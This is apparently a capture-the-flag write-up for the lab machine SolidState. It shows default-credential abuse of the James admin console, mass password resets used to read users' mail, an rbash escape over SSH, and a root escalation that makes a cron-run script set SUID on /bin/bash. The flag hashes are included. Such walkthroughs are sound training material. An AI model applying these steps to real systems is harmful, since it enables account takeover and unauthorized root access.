---
description: 10.10.10.51
---

# SolidState

![](<../../.gitbook/assets/1 (3) (1).JPG>)

## Overview

The following exploits are covered for obtaining the flags on this target: ​

* User - default creds used on exposed James Remote Admin service which allowed for changing user passwords. Check and retreive user mails using new passwords to find SSH creds. SSH as mindy to get rbash shell, use ssh option (-t "bash --noprofile") to get unrestricted shell.
* Root - world writable python script owned by root, being run every 3 minutes, add code to script to modify SUID bit on /bin/bash, wait a few minutes, run bash -p to get root.

## Enumeration:

### Nmap

Let's begin with a basic nmap scan for all TCP ports:

```
└─$ nmap -p- 10.10.10.51             
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-04 09:22 EDT
Nmap scan report for 10.10.10.51
Host is up (0.073s latency).
Not shown: 65529 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
110/tcp  open  pop3
119/tcp  open  nntp
4555/tcp open  rsip

Nmap done: 1 IP address (1 host up) scanned in 21.20 seconds
```

Now that we have a list of open ports, let's run a more targeted nmap scan:

```
└─$ sudo nmap -sS -sV -A -p 22,25,80,110,119,4555 10.10.10.51
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-04 09:23 EDT
NSE: DEPRECATION WARNING: bin.lua is deprecated. Please use Lua 5.3 string.pack
Nmap scan report for 10.10.10.51
Host is up (0.016s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  smtp    JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.2 [10.10.14.2]), PIPELINING, ENHANCEDSTATUSCODES, 
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp  open  pop3    JAMES pop3d 2.3.2
119/tcp  open  nntp    JAMES nntpd (posting ok)
4555/tcp open  rsip?
| fingerprint-strings: 
|   GenericLines: 
|     JAMES Remote Administration Tool 2.3.2
|     Please enter your login and password
|     Login id:
|     Password:
|     Login failed for 
|_    Login id:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4555-TCP:V=7.91%I=7%D=11/4%Time=6183DEEA%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,7C,"JAMES\x20Remote\x20Administration\x20Tool\x202\.3\.2\nPl
SF:ease\x20enter\x20your\x20login\x20and\x20password\nLogin\x20id:\nPasswo
SF:rd:\nLogin\x20failed\x20for\x20\nLogin\x20id:\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.8 (95%), Linux 4.4 (95%), Linux 4.9 (95%), Linux 3.18 (95%), Linux 4.2 (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 25/tcp)
HOP RTT      ADDRESS
1   15.83 ms 10.10.14.1
2   15.98 ms 10.10.10.51

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 278.42 seconds
```

The target appears to be running the JAMES server, which stands for Java Apache Mail Enterprise Server. For more information, check out the following page:

{% embed url="https://james.apache.org" %}

### Whatweb

Let's run whatweb against the target to see which technologies are being used for the webapp.

```
└─$ whatweb http://10.10.10.51/
http://10.10.10.51/ [200 OK] Apache[2.4.25], Country[RESERVED][ZZ], Email[webadmin@solid-state-security.com], HTML5, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[10.10.10.51], JQuery, Script, Title[Home - Solid State Security] 
```

### Nikto

Let's run a Nikto scan against the target.

```
└─$ nikto -host http://10.10.10.51/ -C all     
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.51
+ Target Hostname:    10.10.10.51
+ Target Port:        80
+ Start Time:         2021-11-04 09:30:55 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.25 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/2.4.25 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: 1e60, size: 5610a1e7a4c9b, mtime: gzip
+ Allowed HTTP Methods: POST, OPTIONS, HEAD, GET 
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3092: /LICENSE.txt: License file found may identify site software.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 26470 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2021-11-04 09:40:04 (GMT-4) (549 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

### Gobuster

Let's run a gobuster scan against the target.

```
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.51 -t 50 -q
/images (Status: 301)
/assets (Status: 301)
/server-status (Status: 403)

```

### Website exploration

#### ​​Review the source code for each page

Let's have a look at the page source and make a note of anything interesting:

* Basic website running on Apache
* Seems to only be using HTML and Javascript

#### Review the source code for any scripts used by the site:

Let's have a look at the scripts using the browser dev tools and make a note of anything interesting:

* Nothing obvious found in Javascript files used by the site

### ​Mail ports - TCP 25, 110, 119

All three ports are running a James service.

* TCP 25 - JAMES smtpd 2.3.2
* TCP 110 - JAMES pop3d 2.3.2
* TCP 119 - JAMES nntpd

### James Remote Administration Tool - TCP 4555

Nmap reports that "JAMES Remote Administration Tool 2.3.2" is running on TCP 4555 on the target. Let's do a check against the exploit database to see if this specific version has any entries.

```
└─$ searchsploit james 2.3.2                                                                                130 ⨯
-------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                  |  Path
-------------------------------------------------------------------------------- ---------------------------------
Apache James Server 2.3.2 - Insecure User Creation Arbitrary File Write (Metasp | linux/remote/48130.rb
Apache James Server 2.3.2 - Remote Command Execution                            | linux/remote/35513.py
Apache James Server 2.3.2 - Remote Command Execution (RCE) (Authenticated) (2)  | linux/remote/50347.py
-------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
-------------------------------------------------------------------------------- ---------------------------------
 Paper Title                                                                    |  Path
-------------------------------------------------------------------------------- ---------------------------------
Exploiting Apache James Server 2.3.2                                            | docs/english/40123-exploiting-ap
-------------------------------------------------------------------------------- ---------------------------------
                                                                                      
```

Of the 3 results found, the EDB-ID 35513 entry looks like one we should check out first. Copy the code to the working directory and review.

We find the following comments in the code:

> Info: This exploit works on default installation of Apache James Server 2.3.2
>
> credentials to James Remote Administration Tool (Default - root/root)

Let's try and connect to the target using the above creds and telnet:

```
└─$ telnet 10.10.10.51 4555                                                                                   1 ⨯
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
HELP
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection

```

The default creds work. Using the HELP command, we find some commands we can run, including "listusers".

```
listusers
Existing accounts 6
user: james
user: thomas
user: john
user: mindy
user: mailadmin

```

There is also a command to set a user's password. Let's set a new password for the first four users.

```
setpassword james Password1
Password for james reset
setpassword thomas Password1
Password for thomas reset
setpassword john Password1
Password for john reset
setpassword mindy Password1
Password for mindy reset

```

Since we know the mail services are components of the James server, let's test the creds against the POP3 service to see if we can read some mails.

{% hint style="info" %}
SMTP - this protocol is generally used for sending mail from a mail client to a mail server, and sending mail from one mail server to another, which is also known as mail relay.

POP3 - this protocol is generally used by a mail client to retreive email from a mail server (after the mail has been retreived by the client, the server deletes it's local copy of the email)

IMAP4 - this protocol provides more advanced functionality for communications between a mail client and the server, such as grouping mails in folders, setting flags on mails, searching mailboxes and more&#x20;
{% endhint %}

For this task, let's use telnet as we are not connecting to a secure service. We'll connect in the following order of users and attempt to read their emails: james, thomas, john, mindy

```
└─$ telnet 10.10.10.51 110                                                                                    1 ⨯
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
user james
+OK
pass Password1
+OK Welcome james
list
+OK 0 0
.
quit
+OK Apache James POP3 Server signing off.
Connection closed by foreign host.

└─$ telnet 10.10.10.51 110                                                                                    1 ⨯
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
user thomas
+OK
pass Password1
+OK Welcome thomas
list
+OK 0 0
.
quit
+OK Apache James POP3 Server signing off.
Connection closed by foreign host.

└─$ telnet 10.10.10.51 110                                                                                    1 ⨯
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
user john
+OK
pass Password1
+OK Welcome john
list
+OK 1 743
1 743
.
retr 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <9564574.1.1503422198108.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: john@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <john@localhost>;
          Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
From: mailadmin@localhost
Subject: New Hires access
John, 

Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.

Thank you in advance.

Respectfully,
James

.
quit
+OK Apache James POP3 Server signing off.
Connection closed by foreign host.

└─$ telnet 10.10.10.51 110                                                                                    1 ⨯
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
user mindy
+OK
pass Password1
+OK Welcome mindy
list
+OK 2 1945
1 1109
2 836
.
retr 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
From: mailadmin@localhost
Subject: Welcome

Dear Mindy,
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

We are looking forward to you joining our team and your success at Solid State Security. 

Respectfully,
James
.
retr 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James

.
quit
+OK Apache James POP3 Server signing off.
Connection closed by foreign host.


```

## Gaining Access

We now have a set of SSH creds - mindy:P@55W0rd1!2@

Let's see if they work:

```
└─$ ssh mindy@10.10.10.51
mindy@10.10.10.51's password: 
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
mindy@solidstate:~$ id
-rbash: id: command not found
mindy@solidstate:~$ 

```

Nice, we are able to login, however, we are in a restricted shell. Let's see if we have access to the user flag.

```
mindy@solidstate:~$ id
-rbash: id: command not found
mindy@solidstate:~$ cd ..
-rbash: cd: command not found
mindy@solidstate:~$ pwd
/home/mindy
mindy@solidstate:~$ ls
bin  user.txt
mindy@solidstate:~$ cat user.txt
0510e71c2e8c9cb333b36a38080d0dc2
mindy@solidstate:~$ 
```

We can read the user flag, but we can't do much else. Let's try an old trick to see if we can bypass the restricted shell.

```
└─$ ssh mindy@10.10.10.51 -t "bash --noprofile"                                                               1 ⨯
mindy@10.10.10.51's password: 
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ id
uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ pwd
/home/mindy
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ c d..
bash: c: command not found
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ cd ..
${debian_chroot:+($debian_chroot)}mindy@solidstate:/home$ ls -la
total 16
drwxr-xr-x  4 root  root    4096 Apr 26  2021 .
drwxr-xr-x 22 root  root    4096 Apr 26  2021 ..
drwxr-xr-x 16 james osboxes 4096 Apr 26  2021 james
drwxr-x---  4 mindy mindy   4096 Apr 26  2021 mindy
${debian_chroot:+($debian_chroot)}mindy@solidstate:/home$

```

We have managed to escape the rbash jail.

### Enumeration as "mindy"

Let's check for system information, open ports, running services, sudo and SUID binaries.

```
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ uname -a
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686 GNU/Linux
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ cat /etc/issue
Debian GNU/Linux 9 \n \l

${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ netstat -antp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -                   
tcp        0    612 10.10.10.51:22          10.10.14.2:34124        ESTABLISHED -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 ::1:631                 :::*                    LISTEN      -                   
tcp6       0      0 :::119                  :::*                    LISTEN      -                   
tcp6       0      0 :::25                   :::*                    LISTEN      -                   
tcp6       0      0 :::4555                 :::*                    LISTEN      -                   
tcp6       0      0 :::110                  :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -       
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ps aux | grep root
root         1  0.0  0.3  26948  6348 ?        Ss   11:33   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S    11:33   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    11:33   0:00 [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S<   11:33   0:00 [kworker/0:0H]
root         7  0.0  0.0      0     0 ?        S    11:33   0:01 [rcu_sched]
root         8  0.0  0.0      0     0 ?        S    11:33   0:00 [rcu_bh]
root         9  0.0  0.0      0     0 ?        S    11:33   0:00 [migration/0]
root        10  0.0  0.0      0     0 ?        S<   11:33   0:00 [lru-add-drain]
root        11  0.0  0.0      0     0 ?        S    11:33   0:00 [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    11:33   0:00 [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    11:33   0:00 [cpuhp/1]
root        14  0.0  0.0      0     0 ?        S    11:33   0:00 [watchdog/1]
root        15  0.0  0.0      0     0 ?        S    11:33   0:00 [migration/1]
root        16  0.0  0.0      0     0 ?        S    11:33   0:00 [ksoftirqd/1]
root        18  0.0  0.0      0     0 ?        S<   11:33   0:00 [kworker/1:0H]
root        19  0.0  0.0      0     0 ?        S    11:33   0:00 [kdevtmpfs]
root        20  0.0  0.0      0     0 ?        S<   11:33   0:00 [netns]
root        21  0.0  0.0      0     0 ?        S    11:33   0:00 [khungtaskd]
root        22  0.0  0.0      0     0 ?        S    11:33   0:00 [oom_reaper]
root        23  0.0  0.0      0     0 ?        S<   11:33   0:00 [writeback]
root        24  0.0  0.0      0     0 ?        S    11:33   0:00 [kcompactd0]
root        26  0.0  0.0      0     0 ?        SN   11:33   0:00 [ksmd]
root        27  0.0  0.0      0     0 ?        SN   11:33   0:00 [khugepaged]
root        28  0.0  0.0      0     0 ?        S<   11:33   0:00 [crypto]
root        29  0.0  0.0      0     0 ?        S<   11:33   0:00 [kintegrityd]
root        30  0.0  0.0      0     0 ?        S<   11:33   0:00 [bioset]
root        31  0.0  0.0      0     0 ?        S<   11:33   0:00 [kblockd]
root        32  0.0  0.0      0     0 ?        S<   11:33   0:00 [devfreq_wq]
root        33  0.0  0.0      0     0 ?        S<   11:33   0:00 [watchdogd]
root        34  0.0  0.0      0     0 ?        S    11:33   0:00 [kswapd0]
root        35  0.0  0.0      0     0 ?        S<   11:33   0:00 [vmstat]
root        47  0.0  0.0      0     0 ?        S<   11:33   0:00 [kthrotld]
root        49  0.0  0.0      0     0 ?        S<   11:33   0:00 [ipv6_addrconf]
root        84  0.0  0.0      0     0 ?        S<   11:33   0:00 [mpt_poll_0]
root        85  0.0  0.0      0     0 ?        S<   11:33   0:00 [mpt/0]
root        86  0.0  0.0      0     0 ?        S<   11:33   0:00 [ata_sff]
root       113  0.0  0.0      0     0 ?        S    11:33   0:00 [scsi_eh_0]
root       114  0.0  0.0      0     0 ?        S<   11:33   0:00 [scsi_tmf_0]
root       116  0.0  0.0      0     0 ?        S<   11:33   0:00 [bioset]
root       117  0.0  0.0      0     0 ?        S    11:33   0:00 [scsi_eh_1]
root       119  0.0  0.0      0     0 ?        S<   11:33   0:00 [scsi_tmf_1]
root       120  0.0  0.0      0     0 ?        S    11:33   0:00 [scsi_eh_2]
root       121  0.0  0.0      0     0 ?        S<   11:33   0:00 [scsi_tmf_2]
root       139  0.0  0.0      0     0 ?        S<   11:33   0:00 [kworker/1:1H]
root       140  0.0  0.0      0     0 ?        S<   11:33   0:00 [kworker/0:1H]
root       293  0.0  0.0      0     0 ?        S    11:33   0:00 [jbd2/sda1-8]
root       294  0.0  0.0      0     0 ?        S<   11:33   0:00 [ext4-rsv-conver]
root       322  0.0  0.2  20492  5540 ?        Ss   11:33   0:00 /lib/systemd/systemd-journald
root       325  0.0  0.4  54048  9432 ?        Ssl  11:33   0:06 /usr/bin/vmtoolsd
root       326  0.0  0.0      0     0 ?        S    11:33   0:00 [kauditd]
root       336  0.0  0.2  16448  4432 ?        Ss   11:33   0:00 /lib/systemd/systemd-udevd
root       391  0.0  0.0      0     0 ?        S<   11:33   0:00 [nfit]
root       409  0.0  0.0      0     0 ?        S<   11:33   0:00 [ttm_swap]
root       504  0.0  0.1  23868  3448 ?        Ssl  11:33   0:00 /usr/sbin/rsyslogd -n
root       507  0.0  0.7  53964 16224 ?        Ss   11:33   0:00 /usr/bin/VGAuthService
root       508  0.0  0.4  51912  8448 ?        Ssl  11:33   0:00 /usr/sbin/ModemManager
root       525  0.0  0.7  93768 15508 ?        Ssl  11:33   0:00 /usr/sbin/NetworkManager --no-daemon
root       526  0.0  0.0   2332   584 ?        Ss   11:33   0:00 /bin/sh /opt/james-2.3.2/bin/run.sh
root       527  0.0  0.3  41404  7852 ?        Ssl  11:33   0:00 /usr/lib/accountsservice/accounts-daemon
root       530  0.0  0.2   7440  4668 ?        Ss   11:33   0:00 /lib/systemd/systemd-logind
root       531  0.0  0.1   5264  2816 ?        Ss   11:33   0:00 /usr/sbin/cron -f
root       542  0.1  2.9 847652 60164 ?        Sl   11:33   0:10 /usr/lib/jvm/java-8-openjdk-i386//bin/java -Djava.ext.dirs=/opt/james-2.3.2/lib:/opt/james-2.3.2/tools/lib -Djava.security.manager -Djava.security.policy=jar:file:/opt/james-2.3.2/bin/phoenix-loader.jar!/META-INF/java.policy -Dnetworkaddress.cache.ttl=300 -Dphoenix.home=/opt/james-2.3.2 -Djava.io.tmpdir=/opt/james-2.3.2/temp -jar /opt/james-2.3.2/bin/phoenix-loader.jar
avahi      543  0.0  0.0   6256   300 ?        S    11:33   0:00 avahi-daemon: chroot helper
root       552  0.0  0.4  42076  9804 ?        Ssl  11:33   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       712  0.0  0.2  10472  5332 ?        Ss   11:33   0:00 /usr/sbin/sshd -D
root       725  0.0  0.0   2104    60 ?        Ss   11:33   0:00 /usr/sbin/minissdpd -i 0.0.0.0
root       732  0.0  0.3  41228  6876 ?        Ssl  11:33   0:00 /usr/sbin/gdm3
root       738  0.0  0.3  31512  7464 ?        Sl   11:33   0:00 gdm-session-worker [pam/gdm-launch-environment]
root       781  0.0  0.3  51340  8048 ?        Ssl  11:33   0:00 /usr/lib/upower/upowerd
Debian-+   872  0.0  1.4  98320 29120 tty1     Sl+  11:33   0:00 /usr/bin/Xwayland :1024 -rootless -noreset -listen 4 -listen 5 -displayfd 6
root       903  0.0  0.5  48048 11592 ?        Ssl  11:33   0:00 /usr/lib/packagekit/packagekitd
root       904  0.0  0.2  10772  4936 ?        Ss   11:33   0:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
root       941  0.0  0.2   6408  4408 ?        Ss   11:34   0:00 /usr/sbin/apache2 -k start
root      1130  0.0  0.3  14652  7160 ?        Ss   11:38   0:00 /usr/sbin/cupsd -l
root      1131  0.0  0.3  35424  7228 ?        Ssl  11:38   0:00 /usr/sbin/cups-browsed
root      1419  0.0  0.0      0     0 ?        S    12:02   0:00 [kworker/1:1]
root      1434  0.0  0.0      0     0 ?        S    12:08   0:00 [kworker/u4:1]
root      1522  0.0  0.0      0     0 ?        S    12:22   0:00 [kworker/1:0]
root      1526  0.0  0.0      0     0 ?        S    12:22   0:00 [kworker/0:1]
root      1530  0.0  0.3  11156  6352 ?        Ss   12:22   0:00 sshd: mindy [priv]
root     20791  0.0  0.0      0     0 ?        S    13:04   0:00 [kworker/0:2]
root     20924  0.0  0.0      0     0 ?        S    13:46   0:00 [kworker/u4:2]
root     20994  0.0  0.0      0     0 ?        S    14:02   0:00 [kworker/0:0]
mindy    21017  0.0  0.0   4736   852 pts/0    S+   14:07   0:00 grep root
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ sudo -l
bash: sudo: command not found
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ find / -perm -4000 2>/dev/null
/bin/su
/bin/mount
/bin/bash
/bin/fusermount
/bin/ping
/bin/ntfs-3g
/bin/umount
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/sbin/pppd
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/xorg/Xorg.wrap
/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ 
```

There isn't that much interesting information in the output. Let's look for world writable files.

```
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
/opt/tmp.py
/proc
/sys/fs/cgroup/memory/cgroup.event_control
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ 
```

There is an interesting file in /opt. Let's have a closer look at it.

```
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ cd /opt
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ ls -la
total 16
drwxr-xr-x  3 root root 4096 Aug 22  2017 .
drwxr-xr-x 22 root root 4096 Apr 26  2021 ..
drwxr-xr-x 11 root root 4096 Apr 26  2021 james-2.3.2
-rwxrwxrwx  1 root root  143 Nov  4 14:02 tmp.py
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ cat tmp.py 
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()

${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ 
```

We need to see if this python script is being run regularly as a job of some sort. To do so, lets download pspy32 to the target system and run it to monitor processes.

```
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ./pspy32 
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
...
2021/11/04 14:23:34 CMD: UID=0    PID=1      | /sbin/init 
2021/11/04 14:24:01 CMD: UID=0    PID=22110  | /usr/sbin/CRON -f 
2021/11/04 14:24:01 CMD: UID=0    PID=22111  | /usr/sbin/CRON -f 
2021/11/04 14:24:01 CMD: UID=0    PID=22112  | python /opt/tmp.py 
2021/11/04 14:24:01 CMD: UID=0    PID=22113  | sh -c rm -r /tmp/*  
2021/11/04 14:24:01 CMD: UID=0    PID=22115  | sh -c chmod u+s /bin/bash 
2021/11/04 14:27:01 CMD: UID=0    PID=22117  | /usr/sbin/CRON -f 
2021/11/04 14:27:01 CMD: UID=0    PID=22118  | /bin/sh -c python /opt/tmp.py 
2021/11/04 14:27:01 CMD: UID=0    PID=22119  | python /opt/tmp.py 
2021/11/04 14:27:02 CMD: UID=0    PID=22120  | sh -c rm -r /tmp/*  
2021/11/04 14:27:02 CMD: UID=0    PID=22122  | sh -c chmod u+s /bin/bash 
^CExiting program... (interrupt)

```

Based on the output above, we can see that root (UID=0) is running the script every 3 minutes. Since we have write access to the script, we can modify it to escalate to root.​ ​ ​

## Privilege Escalation

​ ​ ​ ​ ​ ​

Let's modify the /opt/tmp.py script by adding the following line, which will add the SUID bit to the /bin/bash binary. Once that is done, all we need to do is run /bin/bash to get root and grab the root flag.

```
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1265272 May 15  2017 /bin/bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1265272 May 15  2017 /bin/bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1265272 May 15  2017 /bin/bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ /bin/bash -p
bash-4.4# id
uid=1001(mindy) gid=1001(mindy) euid=0(root) groups=1001(mindy)
bash-4.4# cat /root/root.txt
4f4afb55463c3bc79ab1e906b074953d
bash-4.4# 

```



## Resources

{% embed url="https://www.jscape.com/blog/smtp-vs-imap-vs-pop3-difference" %}

​[https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/](https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/)



